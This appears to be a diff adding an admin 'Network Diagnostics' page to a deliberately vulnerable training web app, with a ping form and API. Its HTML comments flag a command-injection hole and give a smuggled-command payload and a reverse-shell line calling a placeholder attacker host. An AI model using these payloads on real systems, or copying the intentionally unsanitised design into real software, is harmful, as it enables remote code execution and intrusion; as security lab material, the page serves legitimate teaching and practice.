@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Network Tools — Admin MyEduConnect</title>
+    <link rel="stylesheet" href="/static/css/main.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="admin-layout">
+    <aside class="admin-sidebar">
+        <div class="sidebar-brand">◈ MyEduConnect<br><small style="font-weight:400; opacity:.5;">Admin Panel</small></div>
+        <nav style="margin-top:16px;">
+            <a href="/admin/dashboard">📊 Dashboard</a>
+            <a href="/admin/users">👥 Students</a>
+            <a href="/admin/network" class="active">🔧 Network Tools</a>
+            <a href="/admin/logout">⬅ Logout</a>
+        </nav>
+    </aside>
+    <main class="admin-main">
+        <h1 class="admin-title">Network Diagnostics</h1>
+        <p style="color:var(--gray-500); margin-top:-16px; margin-bottom:24px;">Server connectivity tools for administrators.</p>
+
+        <div class="card" style="max-width:600px;">
+            <h3>Ping Host</h3>
+            <p style="color:var(--gray-500); font-size:14px; margin-bottom:16px;">
+                Check connectivity to any server. Enter a hostname or IP address.
+            </p>
+            <!-- VULN: command injection — input is concatenated directly into shell command -->
+            <!-- Payload: 127.0.0.1; id -->
+            <!-- Reverse shell: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 -->
+            <form method="POST">
+                <div class="form-group">
+                    <label>Host / IP Address</label>
+                    <input type="text" name="host" placeholder="e.g. 8.8.8.8 or google.com" value="127.0.0.1">
+                    <p class="form-hint">Enter the target hostname or IP to ping.</p>
+                </div>
+                <button type="submit" class="btn btn-primary">Run Ping</button>
+            </form>
+
+            {% if output %}
+            <div style="margin-top:20px;">
+                <label style="display:block; margin-bottom:8px;">Output:</label>
+                <div class="terminal">{{ output }}</div>
+            </div>
+            {% endif %}
+        </div>
+
+        <div class="card" style="max-width:600px; margin-top:16px;">
+            <h3>REST API — Ping endpoint</h3>
+            <p style="color:var(--gray-500); font-size:14px; margin-bottom:16px;">
+                The same functionality is exposed via the REST API at <code>/api/ping</code>.<br>
+                Example: <code>GET /api/ping?host=127.0.0.1</code>
+            </p>
+            <div class="terminal" id="api-output">Waiting for request...</div>
+            <div style="margin-top:12px; display:flex; gap:8px;">
+                <input type="text" id="api-host" placeholder="127.0.0.1" style="flex:1;">
+                <button class="btn btn-primary btn-sm" onclick="apiPing()">Send</button>
+            </div>
+        </div>
+    </main>
+</div>
+<script>
+async function apiPing() {
+    const host = document.getElementById('api-host').value || '127.0.0.1';
+    document.getElementById('api-output').textContent = 'Running...';
+    try {
+        const r = await fetch('/api/ping?host=' + encodeURIComponent(host));
+        const d = await r.json();
+        document.getElementById('api-output').textContent = d.output || d.error || JSON.stringify(d);
+    } catch(e) {
+        document.getElementById('api-output').textContent = 'Error: ' + e.message;
+    }
+}
+</script>
+</body>
+</html>
